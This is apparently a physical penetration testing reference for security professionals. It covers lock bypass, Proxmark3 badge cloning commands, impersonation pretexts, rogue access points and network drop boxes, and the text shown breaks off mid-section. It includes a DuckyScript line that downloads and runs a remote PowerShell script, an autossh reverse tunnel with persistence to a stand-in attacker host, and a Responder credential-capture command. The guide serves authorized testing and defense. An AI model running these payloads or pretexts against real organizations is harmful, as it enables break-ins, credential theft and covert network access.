# Physical Security Reference

> **Audience**: Cybersecurity professionals, physical penetration testers, red teamers, and security engineers.
> **Purpose**: Comprehensive hands-on reference for physical security assessment and physical penetration testing.

---

## Table of Contents

1. [Physical Security Fundamentals](#1-physical-security-fundamentals)
2. [Physical Penetration Testing Overview](#2-physical-penetration-testing-overview)
3. [Lock Picking](#3-lock-picking)
4. [Badge / Access Card Attacks](#4-badge--access-card-attacks)
5. [Social Engineering for Physical Access](#5-social-engineering-for-physical-access)
6. [Wireless Physical Attacks](#6-wireless-physical-attacks)
7. [Physical Network Attacks](#7-physical-network-attacks)
8. [Server Room / Data Center Security](#8-server-room--data-center-security)
9. [CCTV and Surveillance Systems](#9-cctv-and-surveillance-systems)
10. [OSINT for Physical Reconnaissance](#10-osint-for-physical-reconnaissance)
11. [Physical Security Controls Assessment Checklist](#11-physical-security-controls-assessment-checklist)
12. [Physical Security Standards and Frameworks](#12-physical-security-standards--frameworks)

---

## 1. Physical Security Fundamentals

### Why Physical Security Matters for Cyber

Physical access to a system bypasses nearly all technical controls. An attacker with physical access can:

- Boot from external media and bypass disk encryption (without TPM)
- Perform cold boot attacks to recover RAM contents (including encryption keys)
- Install persistent hardware implants (keyloggers, network taps, rogue devices)
- Directly connect to internal network ports, bypassing perimeter firewalls
- Access unlocked workstations or extract data from unencrypted drives
- Tamper with hardware supply chain (BIOS/UEFI implants, malicious replacement components)
- Clone access cards and defeat logical access controls
- Observe sensitive information (shoulder surfing, screen capture)

**Key principle**: A compromised physical perimeter can render all logical security investments worthless.

### Physical Security Domains

#### Perimeter Security
- **Fencing and walls**: Chain-link (lowest), welded wire, concrete masonry walls (high security)
- **Barriers**: Jersey barriers, bollards (shallow-mount vs deep-mount), K-rated vehicle barriers
- **Vehicle access controls**: Crash-rated gates, tire spikes, delta barriers, rising arm barriers
- **Setback distance**: FEMA 426/427 standards for blast resistance setback
- **Landscaping as security**: Berms, thorny hedges, natural barriers

#### Building Access
- **Doors**: Solid-core wood (minimum), hollow metal doors (commercial), steel security doors
- **Hinges**: Concealed or security hinges (prevent hinge pin removal), anti-lift pins
- **Locks**: Deadbolts, mortise locks, electronic cipher locks, magnetic locks, electrified hardware
- **Card readers**: Proximity, smart card, biometric, multi-factor (card + PIN)
- **Mantraps / airlocks**: Dual-door vestibule — second door only opens after first closes, single occupancy enforced
- **Turnstiles**: Full-height, waist-height, optical (defeated by tailgating unless monitored)

#### Interior Security
- **Server cages**: Welded wire cages within data centers, cage locks
- **Server rooms**: Dedicated rooms with badge-only access, no window exposure
- **Safes**: TL-30 (tool resistant 30 min), TRTL (tool + torch), vault rooms
- **Cable locks**: Kensington-style locks for laptops and portable equipment
- **Secure file rooms**: Separate cipher-locked rooms for sensitive paper documents

#### Surveillance
- **CCTV**: IP cameras (H.264/H.265), analog cameras, PTZ (pan-tilt-zoom)
- **NVR/DVR**: Network/digital video recorders — retention typically 30–90 days
- **Motion sensors**: PIR (passive infrared), microwave, dual-tech sensors
- **Guards**: Reception, roving patrol, static post
- **Guard tour systems**: Electronic wand systems that verify guard patrol routes

#### Environmental Controls
- **Power**: UPS (uninterruptible power supply), redundant feeds, generator backup
- **Cooling**: CRAC units (computer room air conditioning), N+1 redundancy
- **Fire suppression**: Clean agent (FM-200, Novec 1230) preferred over water for server rooms; VESDA (very early smoke detection apparatus)
- **Water/flood**: Raised floor minimum 6 inches, leak detection sensors
- **Seismic**: Anchor racks to floor/wall in earthquake zones

### Physical Security Standards

| Standard | Scope | Key Requirements |
|---|---|---|
| NIST SP 800-116 | PIV Card Usage | Smart card implementation for physical and logical access |
| NIST SP 800-53 Rev 5 PE | Physical & Env Protection | PE-1 through PE-23 controls |
| ISO 27001:2022 Annex A.7 | Physical Controls | 14 physical and environmental security controls |
| ANSI/ASIS PSP | Physical Security Professional | Comprehensive physical security framework |
| IEC 62443 | Industrial/OT Physical | Physical security for industrial control systems |
| NERC CIP-006 | Electric Grid | Physical security for bulk electric systems |
| UL 2050 | Alarm Monitoring | Central station alarm monitoring standard |

---

## 2. Physical Penetration Testing Overview

### Legal Requirements — CRITICAL

Physical penetration testing carries serious legal risk. These are not optional:

1. **Written Scope and Authorization**: Signed by an authorized officer of the target organization (not just IT). Must specify:
   - Physical locations in scope
   - Dates/times of testing window
   - Permitted techniques (lock picking, tailgating, impersonation, etc.)
   - Out-of-scope areas (e.g., active production lines, sensitive research areas)

2. **Rules of Engagement (RoE)**: Defines escalation procedures, abort criteria, emergency contacts

3. **Get-Out-of-Jail Letter**: Carry a printed copy AND a digital copy (email on phone). Contains:
   - Your name and contact information
   - Client's name and point of contact with phone number
   - Scope summary
   - Emergency contact for client (available 24/7 during testing)

4. **Local Law Awareness**: Physical pentesting can lead to charges including:
   - Breaking and entering (even if doors are unlocked)
   - Burglary (entry with intent)
   - Criminal trespass
   - Computer fraud (if you access systems)
   - Impersonation of officials (do not impersonate law enforcement)

5. **Abort Criteria**: Pre-defined conditions when testing stops immediately (e.g., armed response, injury risk)

### Pre-Engagement: Reconnaissance

#### OSINT Gathering
- **Google Maps/Earth**: Facility layout, entry points, loading docks, parking structure, camera locations
- **Street View**: Perimeter inspection, lock types visible at entrance, badge reader types
- **LinkedIn**: Employees by department, security staff names, facilities manager, badge photos
- **Job postings**: Security technology stack revealed ("Lenel OnGuard", "Genetec Security Center")
- **Building permits**: Publicly available architectural drawings in many jurisdictions
- **Company website**: Office hours, visitor procedures, reception information
- **Social media**: Interior photos, badge designs visible in employee photos

#### Site Reconnaissance (External Observation)
- Photograph entry/exit points, camera positions, guard posts
- Observe employee badge-wearing habits, tailgating culture
- Identify delivery hours and procedures
- Note smoking areas (often used by employees propping doors open)
- Identify vendor/contractor access patterns
- Watch for unescorted visitor patterns

### Physical Pentesting Methodology

**Phase 1: Reconnaissance**
- External observation and photography
- OSINT correlation
- Identify target entry points and weakest access controls

**Phase 2: Social Engineering Preparation**
- Develop pretext(s) appropriate to the target
- Prepare props: fake badges, uniforms, business cards, vehicles
- Brief team on cover stories
- Rehearse scenarios

**Phase 3: Physical Bypass Attempts**
- Execute social engineering (tailgating, impersonation)
- Attempt physical bypass of access controls (lock picking, loiding, bypass tools)
- Deploy monitoring/implants if in scope
- Document evidence (covert photos/video)

**Phase 4: Documentation and Evidence Collection**
- Photograph physical vulnerabilities (unlocked doors, exposed network jacks, clean desk violations)
- Collect samples (test drive badge cloning if authorized)
- Document all observations with timestamps

**Phase 5: Reporting**
- Executive summary with business risk context
- Technical findings with CVSS physical scoring
- Evidence photos/video
- Remediation recommendations with prioritization
- Lessons learned for security culture

### Key Resources

- *"The Physical Pentest Methodology"* — Toby Wynne (comprehensive field guide)
- *Penetration Testing Execution Standard (PTES)* — Physical Security section
- *"Unauthorised Access: Physical Penetration Testing For IT Security Teams"* — Wil Allsopp
- *"Low Tech Hacking"* — Jack Wiles (social engineering + physical attacks)
- ASIS International: Physical Security Professional (PSP) certification body of knowledge

---

## 3. Lock Picking

### Lock Types and Vulnerability Assessment

| Lock Type | Common Vulnerabilities | Difficulty | Recommended Tools |
|---|---|---|---|
| Pin tumbler (most common) | SPP, raking, bumping, impressioning | Low-Medium | Lock picks, tension wrench |
| Wafer lock | Easier to rake than pin tumbler | Low | Wafer picks, rake |
| Disc detainer | Requires specialized pick | Medium | Sparrows disc detainer pick |
| Tubular lock (vending, bike locks) | Tubular pick, 7-pin variant | Low-Medium | Tubular lock pick (impressioning type) |
| Lever lock (older European) | Lever pick, false gate attacks | Medium-High | Lever picks |
| High security — Medeco | Sidebar + angled pins defeat standard picks | Very High | Bypass preferred |
| High security — Abloy Protec2 | Disc detainer, no springs — very pick resistant | Very High | Bypass preferred |
| High security — Mul-T-Lock | Pin-in-pin system, very pick resistant | High | Bypass preferred |
| Padlock (standard Master Lock) | Shimming, raking, bumping, bypass | Low | Shims, bump key, bypass shim |
| Combination lock (dial) | Manipulation, bypass, decoding | Medium | Bypass shim for resettable combos |
| Electronic keypad | Code guessing, bypass, power manipulation | Varies | Bypass tools |
| Magnetic lock (maglocking) | Bypass via power disruption, REX sensors | Medium | Bypass depends on installation |

### Lock Picking Fundamentals

#### Single Pin Picking (SPP)
The gold standard for controlled, quiet lock opening:

1. Insert tension wrench into bottom of keyway; apply light rotational tension
2. Insert pick into top of keyway
3. Feel for the binding pin (the one with resistance from the tension)
4. Gently lift the binding pin until you feel/hear a slight click (pin set)
5. Find next binding pin and repeat
6. All pins set → plug rotates → lock opens

**Key principle**: The tension creates a slight misalignment between the plug and shell. Pins that reach the shear line "set" on the step created by this misalignment.

**Tension**: Too much = pins bind and won't set; Too little = pins fall back

#### Raking
Faster but less controlled; good for low-security pin tumbler locks:

- Insert rake (city rake, snake rake, bogota) and apply moderate tension
- Rapidly move rake in/out and up/down to randomly set pins
- Works quickly on low-tolerance locks; often won't work on quality locks
- Common rakes: City rake, snake rake, Bogota, Worm rake, Batarang

#### Lock Bumping
- **Bump key**: Cut to maximum depth at every position (999 key)
- Insert bump key one position back, apply rotational tension
- Strike the key inward with a rubber mallet/hand while maintaining tension
- Kinetic energy transmitted through key pin to driver pin momentarily separates them
- Rotation occurs in the moment of separation
- **Countermeasure**: Security pins (spool, serrated, mushroom pins) make bumping much harder

#### Impressioning
- Insert blank key, apply rotational pressure
- Key marks indicate where driver pins are resting on key blank
- File down marks carefully, repeat until key operates lock
- **Use case**: Leave no trace — the lock is unchanged, a working key is created

### Lock Bypass Techniques (Without Picking)

These techniques open doors without picking the lock mechanism:

#### Under-Door Tool (UDT)
- Slide a thin probe under door gap, angle upward, hook lever/door handle
- Works on lever handles (common in offices), emergency bars
- Requires gap of ~0.5–1 inch under door
- **Countermeasure**: Door sweep/seal, door bottom strip, anti-UDT door guards

#### Loiding (Credit Card / Shim Method)
- Insert flexible plastic between door edge and frame at latch location
- Push/slide shim toward door, push latch back into door
- Only works on spring latches (not deadbolts) and when strike plate allows access
- **Countermeasure**: Deadbolt (spring latch alone is insufficient), latch guard plate, strike plate with lip

#### Air Wedge + Long Reach Tool
- Inflate air wedge in door gap to create space
- Insert long reach rod to:
  - Press emergency release button (common on electronic locks)
  - Depress push bar from outside
  - Activate REX (Request to Exit) sensor
- Minimal door damage
- **Countermeasure**: Interlock systems, door sensors that alarm on gap, door frame reinforcement

#### Crash Bar / Panic Bar Bypass (J-Tool / Thin Jim)
- For outward-opening doors with crash bars (push-to-exit)
- "J-tool": curved rod inserted through gap between door and frame
- Hook around door edge to depress the crash bar from outside
- **Countermeasure**: Crash bar covers/shrouds, door alarms on exterior manipulation

#### Magnet Bypass
- Rare earth magnets (neodymium N52) manipulate internal magnetic latch components
- Primarily affects certain gate latches and some electronic locks with magnetic reed switches
- **Countermeasure**: Shielded locks, non-magnetic latch mechanisms

#### Door Frame Spreading / Gap Attack
- Use spreading tool (pry bar, spreader) to create gap between door and frame
- Force spring latch out of strike plate
- Works on lightweight frames or improperly installed locks
- **Countermeasure**: Heavy-gauge steel frames, reinforced strike plates (3" screws), latch guards

#### REX Sensor Manipulation
- Request-to-Exit sensors unlock doors for egress
- PIR-based REX sensors can be triggered by waving a hand/paper under door gap
- **Countermeasure**: Time-delayed REX, camera coverage of entry to detect manipulation

### Security Pin Types (Anti-Pick)

When picking, security pins create "false sets" — the plug partially rotates as if opening:

| Pin Type | Mechanism | Detection Feel |
|---|---|---|
| Spool pin | Hour-glass shape — driver pin catches on ledge at shear line | False set position (slight rotation), tighter feel then releases |
| Serrated pin | Multiple false sets per pin | Multiple click positions before true set |
| Mushroom pin | Similar to spool; asymmetric catch | False set with plug rotation |
| T-pin | T-shaped catch | False set, harder to release |

**Picking security pins**: Reduce tension during false set to allow security portion to clear, then re-apply. Patience and very light tension is key.

### Quality Lock Picks and Tools

| Brand/Product | Type | Notes |
|---|---|---|
| Sparrows (sparrowslockpicks.com) | Full sets, individual picks | Best value; Canadian brand; Reload kit is excellent starter |
| TOOOL (toool.us) | Community/research | The Open Organisation Of Lockpickers |
| Multipick ELITE | Professional Euro | High-quality picks; German engineering |
| Southord | Sets and individual | Good range; American brand |
| Peterson | Individual picks | Premium; custom; preferred by serious locksport |
| Bogota Lockpicks | Rakes | Triple peak Bogota legendary for raking |

### Learning Resources

- **LockPickingLawyer** (YouTube): 1400+ videos; authoritative lock reviews and picking demos
- **BosnianBill** (YouTube): Detailed technique explanations, lock reviews
- **r/lockpicking** (Reddit): Active community, belt ranking system, progression guide
- **TOOOL** (The Open Organisation Of Lockpickers): Chapters worldwide, meetups
- **DEF CON Lockpicking Village**: Annual hands-on competition and training
- **Locksport International**: Organized competitive locksport

---

## 4. Badge / Access Card Attacks

### Common Access Control Technologies

| Technology | Frequency | Security Level | Cloneable | Notes |
|---|---|---|---|---|
| HID Prox (ProxCard II) | 125 kHz | Very Low | Yes, easily | CSN broadcast in the clear |
| EM4100 / EM410x | 125 kHz | Very Low | Yes, easily | Industry standard for low-sec |
| AWID | 125 kHz | Very Low | Yes | Common in older US installations |
| Indala | 125 kHz | Very Low | Yes | Motorola/HID proprietary |
| MIFARE Classic 1K/4K | 13.56 MHz | Low | Yes | CRYPTO1 cipher completely broken; nested attack recovers all keys |
| MIFARE Ultralight | 13.56 MHz | Low | Yes | No authentication version |
| iCLASS (HID Legacy) | 13.56 MHz | Low | Yes | Master key was publicly disclosed |
| iCLASS SE / iCLASS Seos | 13.56 MHz | High | Difficult | AES + diversified keys per card |
| MIFARE DESFire EV1 | 13.56 MHz | High | Difficult | AES-128; EV1 has some known attacks |
| MIFARE DESFire EV2/EV3 | 13.56 MHz | Very High | Not practical | Mutual auth, transaction MAC |
| PIV / CAC (US Government) | 13.56 MHz | Very High | Not practical | PKI-based; requires private key |
| FeliCa (Japan/transit) | 13.56 MHz | Medium-High | Varies | Used in Suica, Octopus cards |

### Proxmark3 — Premier RFID Research Tool

The Proxmark3 RDV4 is the industry standard for RFID research and physical security testing.

**Basic identification:**
```bash
# Auto-detect card and suggest commands
pm3> auto

# Search for HF (13.56 MHz) card
pm3> hf search

# Search for LF (125 kHz) card
pm3> lf search
```

**HID Prox 125 kHz attacks:**
```bash
# Read HID Prox card
pm3> lf hid read

# Clone HID Prox to T5577 blank card
pm3> lf hid clone --r <raw_hex>

# Simulate HID Prox card
pm3> lf hid sim --r <raw_hex>

# Brute-force HID facility code / card number range
pm3> lf hid brute --fc <facility_code> --cn <start> --delay 500
```

**EM4100 / EM410x attacks:**
```bash
# Read EM4100 card
pm3> lf em 410x read

# Clone EM4100 to T5577 blank
pm3> lf em 410x clone --id <card_id>

# Simulate EM4100
pm3> lf em 410x sim --id <card_id>
```

**MIFARE Classic attacks:**
```bash
# Automated full attack (nested + hardnested + dictionary)
pm3> hf mf autopwn

# Manual nested attack (requires at least one known key sector)
pm3> hf mf nested --1k --tblk 0 --tk ffffffffffff

# Dump all card data after keys recovered
pm3> hf mf dump --gen2

# Restore dump to blank card (gen2 magic card)
pm3> hf mf restore --gen2

# Read specific sector/block
pm3> hf mf rdbl --blk 0 --key ffffffffffff -a
```

**iCLASS attacks:**
```bash
# Read iCLASS card (legacy — known default keys)
pm3> hf iclass read

# Full card dump
pm3> hf iclass dump --ki 0

# Load keys from file
pm3> hf iclass loclass --f hf-iclass-key-file.bin
```

**Useful Proxmark3 utilities:**
```bash
# Write to T5577 (blank LF card)
pm3> lf t55 write --blk 0 --data <data>

# Check T5577 config
pm3> lf t55 detect

# MIFARE Classic default key scan
pm3> hf mf chk --1k -a -b

# Store/recall sessions
pm3> session
```

### Flipper Zero for RFID and NFC

The Flipper Zero is a portable multi-tool that reads, stores, and emulates many card types.

**RFID (125 kHz) capabilities:**
- Reads and emulates: EM4100, HID Prox, AWID, Paradox, Indala, FDX-A, FDX-B, ioProx, Gallagher
- Not supported for write: some brands require Proxmark3

```
RFID → Read → (hold Flipper near card) → Save → (name the card)
RFID → Saved → (select card) → Emulate → (hold Flipper near reader)
RFID → Saved → (select card) → Write → (hold Flipper near blank T5577)
```

**NFC (13.56 MHz) capabilities:**
- Full support: MIFARE Ultralight, MIFARE Ultralight C, NTAG 21x series
- Read only: MIFARE Classic (can read CSN; can emulate for some systems)
- Not supported: DESFire, iCLASS SE, Seos, PIV

```
NFC → Read → (hold Flipper near card) → Save
NFC → Saved → (select card) → Emulate
```

**Flipper Zero limitations vs. Proxmark3:**
- Cannot perform MIFARE Classic cryptographic attacks (no nested attack)
- Cannot write all card types (Proxmark3 with T5577 is more flexible)
- No iCLASS read capability (standard firmware)
- Flipper Zero excels at convenience and portability; Proxmark3 is the research tool

### Long-Range RFID Skimming

For demonstration of risk, researchers have built long-range readers:

- **Bishop Fox Tastic RFID Thief**: Reads HID Prox/EM4100 at distances up to 3 feet (concealed in backpack)
- **Commercial UHF RFID readers** (900 MHz): Reads UHF RFID at 15–30 feet (different technology — used in warehouses)
- **Proximity skimmer demonstrations**: Show that cards broadcast identity without contact

**Physical attack scenario**: Attacker stands near target employee in elevator or break room; long-range reader in backpack silently captures card credentials.

### Badge Attack Countermeasures

| Countermeasure | Effectiveness | Notes |
|---|---|---|
| MIFARE DESFire EV2/EV3 | High | AES with mutual authentication; very resistant |
| iCLASS SE / Seos | High | Modern HID high-security platform |
| Card + PIN (two-factor) | High | Prevents cloned card from working alone |
| Anti-passback | Medium | Prevents the same card entering same door twice without exit |
| RFID-blocking wallet / Faraday sleeve | Medium | Prevents passive skimming; user must remove card to use |
| Audit trails / anomaly detection | Medium | Alert on unusual access patterns |
| Regular access audit | Medium | Deactivate terminated employee cards same day |
| Visitor badges (degrading) | Low-Medium | Time-expiring visual indicators |

---

## 5. Social Engineering for Physical Access

### Tailgating / Piggybacking

**Technique**: Following an authorized person through a secured door without using credentials.

**Common scenarios**:
- "Door barge": walking closely behind someone before door closes, acting like you belong
- Hands-full tactic: carrying boxes/coffee so the authorized person holds the door as a courtesy
- Distracted professional: headphones in, phone to ear, looking at laptop bag
- Wait and tailgate: observe busy entry during high-traffic time (9 AM, lunch)

**Defenses**:
- Mantraps/airlocks: physical prevention (door 2 won't open until door 1 closes)
- Full-height turnstiles: one-person-per-credential enforcement
- Security culture: employees challenge/report tailgaters
- Anti-tailgating training: regular awareness exercises
- Optical turnstiles + video analytics: detect simultaneous passage events

### Pretexting Scenarios

**IT Technician / Contractor**:
- Pretext: "I'm from [outsourced IT provider], here to replace the UPS in the server room"
- Props: polo shirt with IT company logo, laptop bag, tools
- Build credibility: call ahead posing as coordinator to "confirm the appointment"
- Target: server rooms, communications closets, data center floors

**Delivery Person**:
- Pretext: UPS/FedEx/DHL delivery requiring signature
- Props: uniform (purchased online), packages, handheld scanner (prop)
- Urgency: delivery creates time pressure, people don't want to delay
- Target: reception bypass, getting into mailroom or building interior

**Fire Safety Inspector**:
- Pretext: "Annual fire suppression inspection" (often outsourced, employees don't know inspector)
- Props: clipboard, fire inspection forms, hi-vis vest
- Leverage: legal obligation creates compliance pressure
- Target: server rooms (fire suppression systems are there), all floors

**Auditor / Assessor**:
- Pretext: "I'm with [audit firm] conducting the annual [compliance] assessment"
- Props: professional attire, portfolio, business cards
- Target: interviewing employees (information gathering), reviewing physical controls

**New Employee**:
- Pretext: "I just started last week, I haven't gotten my badge sorted yet"
- Relies on employees' desire to be helpful to new colleagues
- Target: general office areas, meeting rooms

### Impersonation Toolkit

| Item | Source | Notes |
|---|---|---|
| Fake badge / ID card | ID card printer (Zebra, HID) + photo editing | Matches target company's badge design (observed via LinkedIn/social media) |
| Vendor uniform | eBay, Amazon, uniform suppliers | Polo shirt or jacket with vendor logo |
| Props/tools | Hardware store, IT supply | Laptop bag, tools create authenticity |
| Business cards | Vistaprint + fake persona | Match company and role claimed |
| Hi-vis vest | Safety supply | Instant "authorized worker" appearance |
| Clipboard with forms | Print realistic inspection/delivery forms | Creates tangible evidence of purpose |

### Vishing Component

Calling ahead significantly increases physical SE success:

1. Call target organization's front desk or facilities department
2. Pose as coordinator from the vendor/audit firm
3. "Confirm" the appointment for your physical visit
4. Optionally: get the name of the contact person you'll meet (then use that name on arrival)
5. Create a paper trail in the target's mind — receptionist will be expecting the visit

### Dumpster Diving (MITRE ATT&CK T1592.002)

Physical dumpster diving can yield:
- Discarded badge access logs (reveal card numbers, access patterns, employee names)
- Network diagrams and IT documentation
- Credentials on sticky notes or printed documents
- Organizational charts
- Decommissioned hard drives (data recovery still possible without secure wiping)
- Employee directories
- Internal phone lists

**Legal note**: Dumpster diving legality varies by jurisdiction. Once trash is placed at public collection point, it is generally not protected property in the US (California v. Greenwood), but laws vary.

**Defenses**:
- Cross-cut paper shredder (strip-cut is insufficient; cross-cut is minimum; micro-cut is best)
- Secure media destruction program (NIST 800-88 compliant)
- Locked/chained dumpsters
- Shredding bins throughout facility

### Shoulder Surfing

- Observe PINs being entered at badge readers, ATMs, door keypads
- View computer screens with sensitive information
- Observe passwords being typed
- High-value targets: badge PIN (opens physical doors), laptop login (direct system access)

**Defenses**:
- Privacy screens on monitors
- PIN pad shields at badge readers
- Awareness training (shield PIN entry)
- Camera surveillance of PIN entry points

---

## 6. Wireless Physical Attacks

### Evil Twin / Rogue Access Point

**Hak5 WiFi Pineapple**:
- Purpose-built device for wireless MITM and monitoring
- Passive recon: records all probe requests (devices advertising known network names)
- PineAP: responds to probe requests with fake APs matching remembered SSIDs
- Captive portal: credential harvesting when clients connect
- Filtering: target specific MAC addresses or SSIDs
- Remote management via web interface or cloud dashboard

**Manual rogue AP with hostapd/dnsmasq**:
```bash
# Create access point interface
hostapd /etc/hostapd/hostapd.conf

# DHCP server for clients
dnsmasq --conf-file=/etc/dnsmasq.conf

# Intercept DNS
# Edit /etc/dnsmasq.conf: address=/#/attacker_ip

# Capture credentials with Responder
responder -I wlan0 -wFbP
```

### Bluetooth Attacks

**Flipper Zero Bluetooth capabilities**:
```
Bluetooth → BLE Spam → (various attack types)
- AAPL Action Modals: floods Apple devices with pairing requests
- Samsung BLE Spam: Samsung device popup flood
- Windows Swift Pair: Windows pairing notification flood
```

**Classic Bluetooth attacks** (legacy devices):
- **BlueJacking**: Send unsolicited messages to discoverable devices
- **BlueSnarfing**: Unauthorized access to phone book, calendar via OBEX protocol (patched in modern devices)
- **BlueBugging**: Remote command execution on vulnerable phones (legacy)
- **Bluetooth Impersonation Attack (BIAS)**: CVE-2020-10135 — spoofs previously paired devices

**Practical use in physical pentesting**:
- BLE scanning to identify employee devices and their proximity
- Detecting BLE-enabled access control devices (some doors use BLE for mobile credentials)
- Identifying IoT devices with BLE interfaces on the network perimeter

### Sub-GHz Radio Attacks (Flipper Zero)

```
Sub-GHz → Read → (capture signal)
Sub-GHz → Saved → (select capture) → Send
Sub-GHz → Read RAW → (capture raw signal)
```

**Fixed code systems** (cloneable):
- Garage door remotes operating at 315/433/868 MHz with fixed codes
- Simple on/off remote controls
- Gate remotes without rolling code
- Capture and replay is trivial

**Rolling code systems (KeeLoq)**:
- Used in modern garage doors (LiftMaster, Chamberlain, Genie)
- Each button press sends a different code derived from a counter
- **RollJam attack** (Samy Kamkar): Jam signal while capturing; force second transmission; play back first captured code later
- Defense: Modern implementations with synchronization limits are more resistant; some are vulnerable to timing attacks

**Other Sub-GHz targets**:
- Tire pressure monitoring systems (TPMS) — passive location tracking
- Weather stations — spoofing
- Door/window contact sensors (some ISM band alarm sensors)
- Smart meter communications (AMI/AMR)
- Car key fobs (some older models vulnerable to amplification/relay attacks)

### Infrared Attacks (Flipper Zero)

```
Infrared → Learn New Remote → (capture)
Infrared → Universal Remotes → TV/HVAC/Projector
```

**Physical security relevance**:
- IR-controlled projectors: disruption during sensitive presentations
- HVAC systems with IR control: environmental disruption
- IR-controlled door locks (rare but present in some hospitality/hotel environments)
- Disabling security cameras with IR blinding (some cameras can be temporarily blinded)

---

## 7. Physical Network Attacks

### Rogue Device Implants

| Device | Description | Capabilities | Size |
|---|---|---|---|
| LAN Turtle (Hak5) | USB Ethernet adapter with embedded Linux | Reverse shell, DNS spoof, packet capture, metasploit modules | USB stick |
| Shark Jack (Hak5) | Inline Ethernet device with scripted payloads | Auto-execute nmap, run nmap/metasploit/responder on connect | Small inline box |
| Packet Squirrel (Hak5) | Transparent inline Ethernet tap | MITM, packet capture to USB storage, VPN tunnel | Small inline box |
| O.MG Cable | Malicious USB cable | WiFi-accessible command shell, HID injection, keylogging | Normal USB-C/A cable |
| Bash Bunny (Hak5) | Multi-mode USB attack device | HID + storage + RNDIS/CDC-ECM, run DuckyScript | USB stick |
| Raspberry Pi Zero W | Full Linux ARM SBC | Fully customizable; reverse SSH/VPN, keylogging, network monitoring | ~65x30mm |
| WiFi Pineapple Nano | WiFi MITM | Wireless credential capture in tiny form factor | Small dongle |

### Drop Box Configuration

**Physical deployment**:
1. Find an accessible network jack: conference rooms, reception, lobbies, hallways near network closets, unoccupied offices
2. Connect device to network jack and power (USB power brick if needed)
3. Verify device obtains DHCP lease
4. Device initiates outbound C2 connection (bypasses most ingress firewall rules)

**Reverse SSH tunnel (persistent callback)**:
```bash
# On drop box (Raspberry Pi / LAN Turtle):
autossh -M 0 -N \
  -o "ServerAliveInterval 30" \
  -o "ServerAliveCountMax 3" \
  -o "ExitOnForwardFailure yes" \
  -R 2222:localhost:22 \
  attacker@your-vps.example.com \
  -i /home/pi/.ssh/id_rsa

# From VPS (attacker):
ssh -p 2222 pi@localhost
```

**VPN callback (alternative to SSH)**:
```bash
# On drop box:
openvpn --config /etc/openvpn/callback.conf --daemon

# VPN server receives connection; attacker routes through VPN to reach implant's network
```

**Persistence mechanisms**:
```bash
# systemd service on drop box
[Unit]
Description=C2 Callback
After=network.target

[Service]
ExecStart=/usr/bin/autossh -M 0 -N -R 2222:localhost:22 attacker@vps -i /root/.ssh/id_rsa
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

**Drop box OPSEC**:
- Use a nondescript case (USB charger housing, inside an old printer/phone)
- Mount inside a network closet if accessible
- Choose ports in low-traffic areas
- Use out-of-band 4G cellular backup if Ethernet connection is cut

### USB Attacks

**Rubber Ducky (Hak5 USB Rubber Ducky)**:
- Appears as a USB HID keyboard to the OS
- Executes DuckyScript payloads at 1000+ keystrokes/second
- Bypasses endpoint DLP that blocks USB storage
- Payload examples:
```
# Windows reverse shell (DuckyScript 3.0)
DELAY 1000
GUI r
DELAY 500
STRING powershell -w h -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
ENTER
```

**Bash Bunny**:
- Supports HID + storage + network (RNDIS/CDC-ECM ethernet emulation) simultaneously
- Can perform: credential capture (Responder), file exfiltration, reverse shell
- Auto-switches between attack modes based on DIP switch position

**O.MG Elite Cable**:
- Looks and functions as a normal USB-C/Lightning/Micro-USB cable
- Contains implanted WiFi-accessible microcontroller
- Remote HID injection: connect to phone, type payload wirelessly
- Keylogging capability in newer versions
- Detectable only by x-ray or advanced cable analysis

**Defenses against USB attacks**:
- USB port blocking via endpoint DLP (CrowdStrike Falcon, Carbon Black, etc.)
- Physical USB port locks (blockers)
- Group Policy: disable USB storage while allowing HID (partially mitigates)
- Security awareness: "never plug in a found USB drive"
- Endpoint detection: behavioral detection of rapid keystroke injection

### Network Jack Hijacking

**Finding target jacks**:
- Conference rooms (often live jacks, frequently unmonitored)
- Reception areas
- Hallway jacks near network closets
- Under desks in temporarily unoccupied areas
- Common areas (break rooms, lobbies)

**802.1X bypass techniques**:

*MAC address cloning* (if no 802.1X):
```bash
# Clone MAC of known-good device
ip link set eth0 down
ip link set eth0 address 00:11:22:33:44:55
ip link set eth0 up
dhclient eth0
```

*Authentication relay* (if 802.1X is present):
- Insert a small switch/hub between the wall jack and an existing connected device
- The legitimate device maintains its 802.1X session
- Attacker's device can send traffic using the authenticated port
- More complex setup requires layer 2 awareness to avoid detection

*Identity spoofing for MAB* (MAC Authentication Bypass):
- Some ports use MAC address as authentication credential
- Identify allowed MAC from another device on same VLAN
- Clone that MAC on attacker device

---

## 8. Server Room / Data Center Security

### Physical Controls Assessment Framework

When assessing a server room or data center, evaluate each control:

**Access Controls**:
- Door type: solid core steel door (hollow metal minimum), no exposed hinges, no windows
- Lock: electronic cipher lock + badge reader (dual-factor at minimum for critical facilities)
- Mantrap/airlock: dual-door vestibule with single-occupancy enforcement and anti-passback
- No master key override that is commonly distributed
- Visitor escort policy: no unescorted access, even for authorized technical staff
- Camera coverage: CCTV on entry points and all server rows, 90-day retention minimum

**Physical Barriers**:
- Server cabinet locks (individual rack locks, not just room lock)
- Cage systems for multi-tenant facilities (welded wire, padlocked cage gates)
- Raised floor tile security (tiles screwed down or locked in critical areas)
- Cable management: no accessible cable runs outside secured area

**Monitoring**:
- Out-of-band management (IPMI/iDRAC/iLO) on separate management VLAN
- Door contact alarms on every entry point with UPS battery backup
- Motion sensors inside room (supplement to camera)
- Environmental sensors: temperature, humidity, water leak, smoke

### Server Hardware Attacks

#### Cold Boot Attack
**Threat**: DRAM retains data for seconds to minutes after power loss (longer at low temperature)

**Attack procedure**:
1. Apply freeze spray or liquid nitrogen to RAM modules
2. Power down target (locked) workstation
3. Physically remove RAM modules
4. Boot attacker system or insert RAM into tool system
5. Read RAM contents: encryption keys (BitLocker, FileVault, LUKS), session tokens, passwords

**Key risk**: Full disk encryption keys (BitLocker, LUKS) stored in RAM are recoverable
**Defense**: TPM with PIN (key not released without correct PIN even on warm boot), memory encryption (AMD SME/SEV, Intel TME)

#### DMA Attacks via Thunderbolt / FireWire
**Threat**: PCIe-based interfaces have direct memory access — they can read/write arbitrary RAM

**Tools**:
- **PCILeech**: Open-source DMA attack framework
  ```bash
  # Read target memory (FPGA-based device connected via Thunderbolt)
  pcileech.exe dump -out memory.bin -device FPGA

  # Search for patterns (e.g., LSASS process memory for credentials)
  pcileech.exe find -sig lsass

  # Write shellcode to memory (bypass locked screen)
